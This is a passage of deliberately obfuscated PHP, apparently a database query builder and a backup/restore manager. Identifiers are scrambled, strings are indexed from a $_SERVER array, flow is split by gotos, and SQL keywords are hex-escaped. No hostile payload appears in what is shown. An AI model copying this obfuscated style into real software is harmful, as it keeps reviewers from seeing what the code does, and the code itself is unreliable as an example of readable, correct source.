$BÜ‚Ó¾Ñ°Â; } protected function parseThinkWhere($F‹ãäêÑóÂ, $bñâ„) { $a˜Á›Ù¬ =& $_SERVER[“]; $DâÏ”÷­•¤ = $a˜Á›Ù¬[33]; switch ($F‹ãäêÑóÂ) { case $a˜Á›Ù¬[339]: $DâÏ”÷­•¤ = $bñâ„; break; case $a˜Á›Ù¬[905]: $DâÏ”÷­•¤ = is_string($bñâ„) ? $bñâ„ : substr($this->parseWhere($bñâ„), 6); break; case $a˜Á›Ù¬[922]: parse_str($bñâ„, $aÀ ‘Ëàƒ); if (isset($aÀ ‘Ëàƒ[$a˜Á›Ù¬[900]])) { $A´†™ƒÕÍË = $a˜Á›Ù¬[50] . strtoupper($aÀ ‘Ëàƒ[$a˜Á›Ù¬[900]]) . $a˜Á›Ù¬[50]; unset($aÀ ‘Ëàƒ[$a˜Á›Ù¬[900]]); } else { $A´†™ƒÕÍË = $a˜Á›Ù¬[904]; } $D˜¤Ó¯¸‹› = array(); foreach ($aÀ ‘Ëàƒ as $fÛ‡ö»ô¼ => $Cö›Ğ“ï¦) { $D˜¤Ó¯¸‹›[] = $this->parseKey($fÛ‡ö»ô¼) . $a˜Á›Ù¬[921] . $this->parseValue($Cö›Ğ“ï¦); } $DâÏ”÷­•¤ = implode($A´†™ƒÕÍË, $D˜¤Ó¯¸‹›); break; } return $DâÏ”÷­•¤; } protected function parseLimit($bëòƒÙŒÈ) { $DÉÚ¸¿‡¤ã =& $_SERVER[“]; return !empty($bëòƒÙŒÈ) ? $DÉÚ¸¿‡¤ã[48] . $bëòƒÙŒÈ . $DÉÚ¸¿‡¤ã[50] : $DÉÚ¸¿‡¤ã[33]; } protected function parseJoin($dİößáÕ²) { $a™Ô”¥Ù‰Û =& $_SERVER[“]; $b×–Íì¾¢Ì = $a™Ô”¥Ù‰Û[33]; if (!empty($dİößáÕ²)) { if (is_array($dİößáÕ²)) { foreach ($dİößáÕ² as $b¬«¢›Â => $f¬™¡í») { if (!1 !== stripos($f¬™¡í», $a™Ô”¥Ù‰Û[923])) { $b×–Íì¾¢Ì .= $a™Ô”¥Ù‰Û[50] . $f¬™¡í»; } else { $b×–Íì¾¢Ì .= $a™Ô”¥Ù‰Û[924] . $f¬™¡í»; } } } else { $b×–Íì¾¢Ì .= $a™Ô”¥Ù‰Û[924] . $dİößáÕ²; } } $b×–Íì¾¢Ì = preg_replace($a™Ô”¥Ù‰Û[925], think_config($a™Ô”¥Ù‰Û[828]) . $a™Ô”¥Ù‰Û[926], $b×–Íì¾¢Ì); return $b×–Íì¾¢Ì; } protected function parseOrder($bÒ£ˆ‡¹óŠ) { $aë‹ªÕùí´ =& $_SERVER[“]; if (is_array($bÒ£ˆ‡¹óŠ)) { $aÖÎõå‹Ş¿ = array(); foreach ($bÒ£ˆ‡¹óŠ as $D¬É‡Ãéñİ => $EŠâêÚ¶ª) { if (is_numeric($D¬É‡Ãéñİ)) { $aÖÎõå‹Ş¿[] = $this->parseKey($EŠâêÚ¶ª); } else { $EŠâêÚ¶ª = in_array(strtoupper(trim($EŠâêÚ¶ª)), array($aë‹ªÕùí´[927], $aë‹ªÕùí´[928])) ? $aë‹ªÕùí´[50] . $EŠâêÚ¶ª : $aë‹ªÕùí´[33]; if (preg_match($aë‹ªÕùí´[929], $D¬É‡Ãéñİ)) { $aÖÎõå‹Ş¿[] = $this->parseKey($D¬É‡Ãéñİ) . $EŠâêÚ¶ª; } else { think_exception($aë‹ªÕùí´[930] . $D¬É‡Ãéñİ); } } } $bÒ£ˆ‡¹óŠ = implode($aë‹ªÕùí´[47], $aÖÎõå‹Ş¿); } return !empty($bÒ£ˆ‡¹óŠ) ? $aë‹ªÕùí´[931] . $bÒ£ˆ‡¹óŠ : $aë‹ªÕùí´[33]; } protected function parseGroup($câµÔ¶ğ) { $EŠ°Ôä‰Ô‹ =& $_SERVER[“]; return !empty($câµÔ¶ğ) ? $EŠ°Ôä‰Ô‹[932] . $câµÔ¶ğ : $EŠ°Ôä‰Ô‹[33]; } protected function parseHaving($aò®›Ìç¿º) { $fñä¶°áç =& $_SERVER[“]; return !empty($aò®›Ìç¿º) ? $fñä¶°áç[933] . $aò®›Ìç¿º : $fñä¶°áç[33]; } protected function parseComment($D¨Í’ğÑòƒ) { $C‰ÅŸÕÉ«‚ =& $_SERVER[“]; return !empty($D¨Í’ğÑòƒ) ? $C‰ÅŸÕÉ«‚[934] . $D¨Í’ğÑòƒ . $C‰ÅŸÕÉ«‚[935] : $C‰ÅŸÕÉ«‚[33]; } protected function parseDistinct($aåÀèùØí¤) { $bØîšõ­¥ =& $_SERVER[“]; return !empty($aåÀèùØí¤) ? $bØîšõ­¥[936] : $bØîšõ­¥[33]; } protected function parseUnion($b»è¦ÖÂÒ¾) { $a•â«ËÜ‹‘ =& $_SERVER[“]; if (empty($b»è¦ÖÂÒ¾)) { return $a•â«ËÜ‹‘[33]; } if (isset($b»è¦ÖÂÒ¾[$a•â«ËÜ‹‘[336]])) { $CÔˆ«³† = $a•â«ËÜ‹‘[937]; unset($b»è¦ÖÂÒ¾[$a•â«ËÜ‹‘[336]]); } else { $CÔˆ«³† = $a•â«ËÜ‹‘[938]; } foreach ($b»è¦ÖÂÒ¾ as $fÔ³ÄÅ’—) { $e‰½ò’©‘¹[] = $CÔˆ«³† . (is_array($fÔ³ÄÅ’—) ? $this->buildSelectSql($fÔ³ÄÅ’—) : $fÔ³ÄÅ’—); } return implode($a•â«ËÜ‹‘[50], $e‰½ò’©‘¹); } public function insert($b×…í¶ï±, $aáË¾ÓŠÉ¨ = array(), $aÒŞŒÃæœì = false) { goto cù¢‘ÙÊ·; cù¢‘ÙÊ·: $EÈæì·¤»¹ =& $_SERVER[“]; $C®Ê­¡½‚ë = $EÍÅÕ±À‰ = array(); $this->model = $aáË¾ÓŠÉ¨[$EÈæì·¤»¹[269]]; goto bœ¬¿ñç‡; cÏ™†‚••’: $c¢å«ã• .= $this->parseComment(!empty($aáË¾ÓŠÉ¨[$EÈæì·¤»¹[341]]) ? $aáË¾ÓŠÉ¨[$EÈæì·¤»¹[341]] : $EÈæì·¤»¹[33]); return $this->execute($c¢å«ã•, $this->parseBind(!empty($aáË¾ÓŠÉ¨[$EÈæì·¤»¹[273]]) ? $aáË¾ÓŠÉ¨[$EÈæì·¤»¹[273]] : array())); goto eÈÈÆº™Ü¸; bœ¬¿ñç‡: foreach ($b×…í¶ï± as $bİÄî‰‰šâ => $bŠ†ä™ïÛ) { if (is_array($bŠ†ä™ïÛ) && $EÈæì·¤»¹[285] == $bŠ†ä™ïÛ[0]) { $EÍÅÕ±À‰[] = $this->parseKey($bİÄî‰‰šâ); $C®Ê­¡½‚ë[] = $bŠ†ä™ïÛ[1]; } elseif (is_scalar($bŠ†ä™ïÛ) || is_null($bŠ†ä™ïÛ)) { $EÍÅÕ±À‰[] = $this->parseKey($bİÄî‰‰šâ); $C®Ê­¡½‚ë[] = $this->parseValue($bŠ†ä™ïÛ); } } $c¢å«ã• = ($aÒŞŒÃæœì ? $EÈæì·¤»¹[805] : $EÈæì·¤»¹[806]) . $EÈæì·¤»¹[807] . $this->parseTable($aáË¾ÓŠÉ¨[$EÈæì·¤»¹[267]]) . $EÈæì·¤»¹[801] . implode($EÈæì·¤»¹[47], $EÍÅÕ±À‰) . $EÈæì·¤»¹[802] . implode($EÈæì·¤»¹[47], $C®Ê­¡½‚ë) . $EÈæì·¤»¹[803]; $c¢å«ã• .= $this->parseLock(isset($aáË¾ÓŠÉ¨[$EÈæì·¤»¹[755]]) ? $aáË¾ÓŠÉ¨[$EÈæì·¤»¹[755]] : !1); goto cÏ™†‚••’; eÈÈÆº™Ü¸: } public function selectInsert($dÚæ‹ÀãØ‡, $aì•Û‹¢ÜÍ, $CàŞ»µè¬† = array()) { goto FŠ—ÈÓò±; FŠ—ÈÓò±: $c§ùá‘ÔÎ =& $_SERVER[“]; $this->model = $CàŞ»µè¬†[$c§ùá‘ÔÎ[269]]; if (is_string($dÚæ‹ÀãØ‡)) { $dÚæ‹ÀãØ‡ = explode($c§ùá‘ÔÎ[47], $dÚæ‹ÀãØ‡); } goto d®”‹ÔÃÛ—; EÙÕ”®•‘”: return $this->execute($Bø¼÷Ô¦çÌ, $this->parseBind(!empty($CàŞ»µè¬†[$c§ùá‘ÔÎ[273]]) ? $CàŞ»µè¬†[$c§ùá‘ÔÎ[273]] : array())); goto e¿—‹äòô‘; d®”‹ÔÃÛ—: array_walk($dÚæ‹ÀãØ‡, array($this, $c§ùá‘ÔÎ[804])); $Bø¼÷Ô¦çÌ = $c§ùá‘ÔÎ[939] . $this->parseTable($aì•Û‹¢ÜÍ) . $c§ùá‘ÔÎ[801] . implode($c§ùá‘ÔÎ[47], $dÚæ‹ÀãØ‡) . $c§ùá‘ÔÎ[918]; $Bø¼÷Ô¦çÌ .= $this->buildSelectSql($CàŞ»µè¬†); goto EÙÕ”®•‘”; e¿—‹äòô‘: } public function update($fäÛê„äê, $fºÀÉç™àë) { $c£ø±Ä¿ì =& $_SERVER[“]; $this->model = $fºÀÉç™àë[$c£ø±Ä¿ì[269]]; $E»³‚ä„ë = $c£ø±Ä¿ì[940] . $this->parseTable($fºÀÉç™àë[$c£ø±Ä¿ì[267]]) . $this->parseSet($fäÛê„äê) . $this->parseWhere(!empty($fºÀÉç™àë[$c£ø±Ä¿ì[263]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[263]] : $c£ø±Ä¿ì[33]) . $this->parseOrder(!empty($fºÀÉç™àë[$c£ø±Ä¿ì[350]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[350]] : $c£ø±Ä¿ì[33]) . $this->parseLimit(!empty($fºÀÉç™àë[$c£ø±Ä¿ì[280]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[280]] : $c£ø±Ä¿ì[33]) . $this->parseLock(isset($fºÀÉç™àë[$c£ø±Ä¿ì[755]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[755]] : !1) . $this->parseComment(!empty($fºÀÉç™àë[$c£ø±Ä¿ì[341]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[341]] : $c£ø±Ä¿ì[33]); return $this->execute($E»³‚ä„ë, $this->parseBind(!empty($fºÀÉç™àë[$c£ø±Ä¿ì[273]]) ? $fºÀÉç™àë[$c£ø±Ä¿ì[273]] : array())); } public function delete($E¿ª¤¼‘íò = array()) { $f¶»Ã‡—ÒØ =& $_SERVER[“]; $this->model = $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[269]]; $CÒ­îÍŞ¿ = $f¶»Ã‡—ÒØ[941] . $this->parseTable($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[267]]) . $this->parseWhere(!empty($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[263]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[263]] : $f¶»Ã‡—ÒØ[33]) . $this->parseOrder(!empty($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[350]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[350]] : $f¶»Ã‡—ÒØ[33]) . $this->parseLimit(!empty($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[280]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[280]] : $f¶»Ã‡—ÒØ[33]) . $this->parseLock(isset($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[755]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[755]] : !1) . $this->parseComment(!empty($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[341]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[341]] : $f¶»Ã‡—ÒØ[33]); return $this->execute($CÒ­îÍŞ¿, $this->parseBind(!empty($E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[273]]) ? $E¿ª¤¼‘íò[$f¶»Ã‡—ÒØ[273]] : array())); } public function select($d†î¡­á¢ = array()) { goto F’íŠ¤±š¨; F’íŠ¤±š¨: $C“Äâ™‚ö› =& $_SERVER[“]; $this->model = $d†î¡­á¢[$C“Äâ™‚ö›[269]]; $B¬Üá¨ = $this->buildSelectSql($d†î¡­á¢); goto còŒÜœ³â®; EìÌâã„¨ï: if ($EÍ«„óÌ´Å && !1 !== $Bà—ÒŒåÂŠ) { think_cache($B²¨øÅŒ†´, $Bà—ÒŒåÂŠ, $EÍ«„óÌ´Å); } return $Bà—ÒŒåÂŠ; goto A¾ÍÉªöœ; còŒÜœ³â®: $EÍ«„óÌ´Å = isset($d†î¡­á¢[$C“Äâ™‚ö›[337]]) ? $d†î¡­á¢[$C“Äâ™‚ö›[337]] : !1; if ($EÍ«„óÌ´Å) { $B²¨øÅŒ†´ = is_string($EÍ«„óÌ´Å[$C“Äâ™‚ö›[89]]) ? $EÍ«„óÌ´Å[$C“Äâ™‚ö›[89]] : $C“Äâ™‚ö›[942] . md5($B¬Üá¨); $b¶ÌÙµ¶‹Œ = think_cache($B²¨øÅŒ†´, $C“Äâ™‚ö›[33], $EÍ«„óÌ´Å); if (!1 !== $b¶ÌÙµ¶‹Œ) { return $b¶ÌÙµ¶‹Œ; } } $Bà—ÒŒåÂŠ = $this->query($B¬Üá¨, $this->parseBind(!empty($d†î¡­á¢[$C“Äâ™‚ö›[273]]) ? $d†î¡­á¢[$C“Äâ™‚ö›[273]] : array())); goto EìÌâã„¨ï; A¾ÍÉªöœ: } public function buildSelectSql($AÃŒÛñ©ôÇ = array()) { goto FáÃ¿–æ¯Î; C¥ïäçÄ‘: $AÎ¡î»Ñ… = $this->parseSql($this->selectSql, $AÃŒÛñ©ôÇ); $AÎ¡î»Ñ… .= $this->parseLock(isset($AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[755]]) ? $AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[755]] : !1); if (isset($e‹‡æÙ§õ)) { think_cache($e‹‡æÙ§õ, $AÎ¡î»Ñ…); } goto E“Ú¾ˆï‰Ã; FáÃ¿–æ¯Î: $e†°²Íâ¥Š =& $_SERVER[“]; if (isset($AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[340]])) { if (strpos($AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[340]], $e†°²Íâ¥Š[47])) { list($F¨Êš¾·¿ˆ, $C¾™¨˜Ëí) = explode($e†°²Íâ¥Š[47], $AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[340]]); } else { $F¨Êš¾·¿ˆ = $AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[340]]; } $F¨Êš¾·¿ˆ = $F¨Êš¾·¿ˆ ? $F¨Êš¾·¿ˆ : 1; $C¾™¨˜Ëí = isset($C¾™¨˜Ëí) ? $C¾™¨˜Ëí : (is_numeric($AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[280]]) ? $AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[280]] : 20); $fÚ”Şõã¬¶ = $C¾™¨˜Ëí * ((int) $F¨Êš¾·¿ˆ - 1); $AÃŒÛñ©ôÇ[$e†°²Íâ¥Š[280]] = $fÚ”Şõã¬¶ . $e†°²Íâ¥Š[47] . $C¾™¨˜Ëí; } if (think_config($e†°²Íâ¥Š[943])) { $e‹‡æÙ§õ = $e†°²Íâ¥Š[944] . md5(serialize($AÃŒÛñ©ôÇ)); $Aòµ§ß­Îƒ = think_cache($e‹‡æÙ§õ); if ($Aòµ§ß­Îƒ) { return $Aòµ§ß­Îƒ; } } goto C¥ïäçÄ‘; E“Ú¾ˆï‰Ã: return $AÎ¡î»Ñ…; goto a•¹ï¿Ï¹; a•¹ï¿Ï¹: } public function parseSql($BâóØ³¡åË, $CÜíÖÏ­°Ï = array()) { $cß½±Ú•Šè =& $_SERVER[“]; $BâóØ³¡åË = str_replace(array($cß½±Ú•Šè[945], $cß½±Ú•Šè[946], $cß½±Ú•Šè[947], $cß½±Ú•Šè[948], $cß½±Ú•Šè[949], $cß½±Ú•Šè[950], $cß½±Ú•Šè[951], $cß½±Ú•Šè[952], $cß½±Ú•Šè[953], $cß½±Ú•Šè[954], $cß½±Ú•Šè[955]), array($this->parseTable("{$CÜíÖÏ­°Ï[$cß½±Ú•Šè[267]]}"), $this->parseDistinct(isset($CÜíÖÏ­°Ï[$cß½±Ú•Šè[956]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[956]] : !1), $this->parseField(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[261]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[261]] : $cß½±Ú•Šè[176]), $this->parseJoin(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[270]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[270]] : $cß½±Ú•Šè[33]), $this->parseWhere(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[263]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[263]] : $cß½±Ú•Šè[33]), $this->parseGroup(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[957]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[957]] : $cß½±Ú•Šè[33]), $this->parseHaving(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[958]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[958]] : $cß½±Ú•Šè[33]), $this->parseOrder(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[350]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[350]] : $cß½±Ú•Šè[33]), $this->parseLimit(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[280]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[280]] : $cß½±Ú•Šè[33]), $this->parseUnion(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[335]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[335]] : $cß½±Ú•Šè[33]), $this->parseComment(!empty($CÜíÖÏ­°Ï[$cß½±Ú•Šè[341]]) ? $CÜíÖÏ­°Ï[$cß½±Ú•Šè[341]] : $cß½±Ú•Šè[33])), $BâóØ³¡åË); return $BâóØ³¡åË; } public function getLastSql($e©‡Éª—ÑÖ = '') { return $e©‡Éª—ÑÖ ? $this->modelSql[$e©‡Éª—ÑÖ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B‰“Éè±æ´) { return addslashes($B‰“Éè±æ´); } public function setModel($Eƒ‚É‹Œëé) { $this->model = $Eƒ‚É‹Œëé; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($fèÃÌ¡Åó´, $D°Œ·¯·–è = '') { $this->database = $fèÃÌ¡Åó´; $this->type = $D°Œ·¯·–è; } public function model($eáÂ¼±Í¾º = '') { return new ModelBase($eáÂ¼±Í¾º, $_SERVER[“][33], $this->database); } public function db($c¥¿ßÒÑ„î = false) { goto BîñŒ§‹’Û; fÚä³³§èÍ: $this->database = $A–‰·±¾Á; $fòÓ‰ŒÜŒ­->execute("\x75\x73\x65\x20\x60{$e–çŠñ„ëÁ}\x60"); return $fòÓ‰ŒÜŒ­; goto eñßŒºö‡; b³å…–ë¾¦: $e–çŠñ„ëÁ = $A–‰·±¾Á[$bº÷õÚô…¬[871]]; $A–‰·±¾Á[$bº÷õÚô…¬[871]] = $bº÷õÚô…¬[33]; if ($A–‰·±¾Á[$bº÷õÚô…¬[706]] == $bº÷õÚô…¬[707]) { $eò½­ŸåØ‹ = $A–‰·±¾Á[$bº÷õÚô…¬[708]]; $A–‰·±¾Á[$bº÷õÚô…¬[708]] = substr($eò½­ŸåØ‹, 0, strrpos($eò½­ŸåØ‹, $bº÷õÚô…¬[959])); } goto A¦Åƒ’éÜì; A¦Åƒ’éÜì: $this->database = $A–‰·±¾Á; $fòÓ‰ŒÜŒ­ = $this->model()->db(); try { $A™ÀâáÏó = $fòÓ‰ŒÜŒ­->execute("\163\x68\157\167\40\144\x61\x74\x61\142\x61\163\x65\x73\40\x6c\x69\x6b\145\40\x27{$e–çŠñ„ëÁ}\47"); } catch (Exception $Dºµ¯¤¹¤—) { } goto dèâÕ•§å; BîñŒ§‹’Û: $bº÷õÚô…¬ =& $_SERVER[“]; $A–‰·±¾Á = array_change_key_case($this->database); if ($this->type == $bº÷õÚô…¬[9] || !$c¥¿ßÒÑ„î) { return $this->model()->db(); } goto b³å…–ë¾¦; dèâÕ•§å: if (!$A™ÀâáÏó) { $fòÓ‰ŒÜŒ­->execute("\143\x72\145\x61\164\145\40\x64\x61\x74\x61\142\141\x73\145\40\x60{$e–çŠñ„ëÁ}\x60"); } $A–‰·±¾Á[$bº÷õÚô…¬[871]] = $e–çŠñ„ëÁ; if ($A–‰·±¾Á[$bº÷õÚô…¬[706]] == $bº÷õÚô…¬[707]) { $A–‰·±¾Á[$bº÷õÚô…¬[708]] .= $bº÷õÚô…¬[959] . $e–çŠñ„ëÁ; } goto fÚä³³§èÍ; eñßŒºö‡: } public function createTable($Béá¼‘¡„†, $f‰ÃğÆÅù = null) { $aáôêÃÛÔÏ =& $_SERVER[“]; if (!IO::exist($Béá¼‘¡„†)) { ActionCall($aáôêÃÛÔÏ[960], !0, 0); show_json(LNG($aáôêÃÛÔÏ[961]), !1); } $D……Õñö”‹ = sqlSplit(IO::getContent($Béá¼‘¡„†)); foreach ($D……Õñö”‹ as $a×˜¥è—) { if ($f‰ÃğÆÅù) { $Cäò“¦Ê¢İ = stripos($a×˜¥è—, $aáôêÃÛÔÏ[962]) === 0; if ($Cäò“¦Ê¢İ) { $f‰ÃğÆÅù->task[$aáôêÃÛÔÏ[963]] += 1; } } $this->model()->db()->execute($a×˜¥è—); if ($f‰ÃğÆÅù && $Cäò“¦Ê¢İ) { preg_match($aáôêÃÛÔÏ[964], $a×˜¥è—, $D…æÈŠÎº); $f‰ÃğÆÅù->task[$aáôêÃÛÔÏ[965]] = $D…æÈŠÎº[1]; $f‰ÃğÆÅù->update(1); } } $this->taskToCache($f‰ÃğÆÅù); } public function insertTable($d™ íå…ÕÙ, $D¢Ñç”ŸÖŠ = null) { $dÙ¹™Æ•ô¸ =& $_SERVER[“]; $dù¥ø­ëÜ§ = $this->model()->db(); $dºÆ•²®¾ = $dæñêÚæÒ ? array($dæñêÚæÒ) : $dù¥ø­ëÜ§->getTables(); foreach ($d™ íå…ÕÙ as $F¯ÕÉ¨ä) { $dæñêÚæÒ = basename($F¯ÕÉ¨ä, $dÙ¹™Æ•ô¸[701]); if (!in_array($dæñêÚæÒ, $dºÆ•²®¾)) { continue; } if ($D¢Ñç”ŸÖŠ) { $D¢Ñç”ŸÖŠ->task[$dÙ¹™Æ•ô¸[965]] = $dæñêÚæÒ; } if (get_filesize($F¯ÕÉ¨ä) == 0) { continue; } $FƒÍ‘«ÍÑÈ = $this->sqlToDb($F¯ÕÉ¨ä, $D¢Ñç”ŸÖŠ); if (!$FƒÍ‘«ÍÑÈ) { ActionCall($dÙ¹™Æ•ô¸[960], !0, 0); show_json(LNG($dÙ¹™Æ•ô¸[966]) . "\133{$dæñêÚæÒ}\x5d", !1); } } $this->taskToCache($D¢Ñç”ŸÖŠ); } public function sqlFromDb($EùÍñÀÁ, $F®á’ÁÊ¥‹, $C­Ùã¢Öˆ = null, $a•÷ÍÁğ·° = null) { goto f‹ÇƒµÊ¥; F’æ‰£ÆÖ…: $CÄĞ¤Ó³ = 1; $EÂØ¦è‰Â’ = 500; $Bë”‘ô³®ª = fopen($F®á’ÁÊ¥‹, $_SERVER[“][967]); goto E´¬öîˆÖ; f‹ÇƒµÊ¥: if ($C­Ùã¢Öˆ) { $C­Ùã¢Öˆ->task[$_SERVER[“][965]] = $EùÍñÀÁ; } $cÄ«ˆÆÖ° = $this->model($EùÍñÀÁ); $bßĞäÖ²â› = 0; goto F’æ‰£ÆÖ…; fÖ¥™¿ËÀÛ: fclose($Bë”‘ô³®ª); return $bßĞäÖ²â›; goto aê†«ØÓë; E´¬öîˆÖ: $B«ó°Ë„• = $cÄ«ˆÆÖ°->getPk(); $EÑ÷ÏÑÆù = $cÄ«ˆÆÖ°->getDbFields(); do { $EœéÀÖèªõ = $cÄ«ˆÆÖ°->field($EÑ÷ÏÑÆù)->order($B«ó°Ë„• . $_SERVER[“][968])->selectPage($EÂØ¦è‰Â’, $CÄĞ¤Ó³); $CÎ‘½÷ ëÆ = isset($EœéÀÖèªõ[$_SERVER[“][351]][$_SERVER[“][353]]) ? $EœéÀÖèªõ[$_SERVER[“][351]][$_SERVER[“][353]] : 0; $bóÒ‡‹•ë¼ = !empty($EœéÀÖèªõ[$_SERVER[“][354]]) ? $EœéÀÖèªõ[$_SERVER[“][354]] : array(); if (!($d»ï”Ö‡† = count($bóÒ‡‹•ë¼))) { break; } $A Ô¾¼» = array(); foreach ($bóÒ‡‹•ë¼ as $A¢¶ƒ–Õ©á) { if ($EùÍñÀÁ == $_SERVER[“][969] && $A¢¶ƒ–Õ©á[$_SERVER[“][29]] == $_SERVER[“][970]) { $aÙ‰”“·§î = json_decode($A¢¶ƒ–Õ©á[$_SERVER[“][359]], !0); if ($aÙ‰”“·§î[$_SERVER[“][28]] == date($_SERVER[“][674]) && !$aÙ‰”“·§î[$_SERVER[“][673]]) { continue; } } if ($a•÷ÍÁğ·°) { $A¢¶ƒ–Õ©á[$_SERVER[“][75]] = "\x7b\151\157\x3a{$a•÷ÍÁğ·°}\175" . substr($A¢¶ƒ–Õ©á[$_SERVER[“][75]], strlen("\x7b\151\157\72{$A¢¶ƒ–Õ©á[$_SERVER[“][727]]}\175")); $A¢¶ƒ–Õ©á[$_SERVER[“][727]] = $a•÷ÍÁğ·°; } $A Ô¾¼»[] = $_SERVER[“][971] . $this->sqlEncode($A¢¶ƒ–Õ©á) . $_SERVER[“][972]; } $c¢Şæ¥í‚ = "\x49\116\123\105\x52\124\40\111\116\124\117\x20\x60{$EùÍñÀÁ}\140\40\50\x60" . implode($_SERVER[“][973], $EÑ÷ÏÑÆù) . $_SERVER[“][974]; fwrite($Bë”‘ô³®ª, $c¢Şæ¥í‚ . implode($_SERVER[“][975], $A Ô¾¼») . $_SERVER[“][67] . PHP_EOL); $CÄĞ¤Ó³++; $bßĞäÖ²â› += $d»ï”Ö‡†; if ($C­Ùã¢Öˆ) { $C­Ùã¢Öˆ->update($d»ï”Ö‡†); } } while ($CÄĞ¤Ó³ <= $CÎ‘½÷ ëÆ); goto fÖ¥™¿ËÀÛ; aê†«ØÓë: } public function sqlToDb($C…ªöËšˆê, $e¾¥å±Í = null) { goto C¥´‡âğ¡§; Få‡Æñä„í: if (trim($Dìİ‰÷½—›)) { $Dìİ‰÷½—› = rtrim(trim($Dìİ‰÷½—›), $d¥ÓÖÆÔñ×[67]); if (!$dˆçùßÂƒ->execute($Dìİ‰÷½—›)) { return !1; } if ($e¾¥å±Í) { $e¾¥å±Í->update($dÌÒœÕ„ßÑ - 1); } } return !0; goto DïòÆİÆ¢°; fš»Ë“¤«í: if (!$BéÓù¼«Õ‹) { return !1; } $dÌÒœÕ„ßÑ = 0; $Dìİ‰÷½—› = $d¥ÓÖÆÔñ×[33]; goto f÷Éº‚Ä‡¬; f÷Éº‚Ä‡¬: $e•’»¢”ß˜ = 500 + 1; while (!feof($BéÓù¼«Õ‹)) { if ($e¾¥å±Í && $dÌÒœÕ„ßÑ != 0) { $e¾¥å±Í->task[$d¥ÓÖÆÔñ×[963]] += 1; } $dÌÒœÕ„ßÑ++; $e‘‡Ã…Ç‡ª = trim(fgets($BéÓù¼«Õ‹)); $Dìİ‰÷½—› .= $d¥ÓÖÆÔñ×[50] . $this->sqlDecode($e‘‡Ã…Ç‡ª, $this->type); if ($dÌÒœÕ„ßÑ == $e•’»¢”ß˜) { $Dìİ‰÷½—› = rtrim(trim($Dìİ‰÷½—›), $d¥ÓÖÆÔñ×[67]); if (!$dˆçùßÂƒ->execute($Dìİ‰÷½—›)) { return !1; } if ($e¾¥å±Í) { $e¾¥å±Í->update($dÌÒœÕ„ßÑ - 1); } $Dìİ‰÷½—› = $d¥ÓÖÆÔñ×[33]; $dÌÒœÕ„ßÑ = 0; } } fclose($BéÓù¼«Õ‹); goto Få‡Æñä„í; C¥´‡âğ¡§: $d¥ÓÖÆÔñ× =& $_SERVER[“]; $dˆçùßÂƒ = $this->model()->db(); $BéÓù¼«Õ‹ = @fopen($C…ªöËšˆê, $d¥ÓÖÆÔñ×[976]); goto fš»Ë“¤«í; DïòÆİÆ¢°: } public function dropTable($AˆÇ©–ˆĞ = null) { $aÍ‡Ù£ƒÙ† = $this->model()->db(); $c¤çÑõ‰ÑŸ = $AˆÇ©–ˆĞ ? array($AˆÇ©–ˆĞ) : $aÍ‡Ù£ƒÙ†->getTables(); if (!$c¤çÑõ‰ÑŸ) { return; } foreach ($c¤çÑõ‰ÑŸ as $AˆÇ©–ˆĞ) { $aÍ‡Ù£ƒÙ†->execute("\x64\x72\x6f\x70\40\164\141\x62\154\145\40\151\146\x20\145\170\151\163\164\163\40\140{$AˆÇ©–ˆĞ}\x60"); } } private function taskToCache($cä—Êˆä»™ = null) { $Fâ¿ĞÕËîˆ =& $_SERVER[“]; if (!$cä—Êˆä»™) { return; } $f÷ŠŠºŠÕ¤ = array($Fâ¿ĞÕËîˆ[965] => $cä—Êˆä»™->task[$Fâ¿ĞÕËîˆ[965]], $Fâ¿ĞÕËîˆ[963] => $cä—Êˆä»™->task[$Fâ¿ĞÕËîˆ[963]], $Fâ¿ĞÕËîˆ[977] => $cä—Êˆä»™->task[$Fâ¿ĞÕËîˆ[977]]); if ($f÷ŠŠºŠÕ¤[$Fâ¿ĞÕËîˆ[963]] == 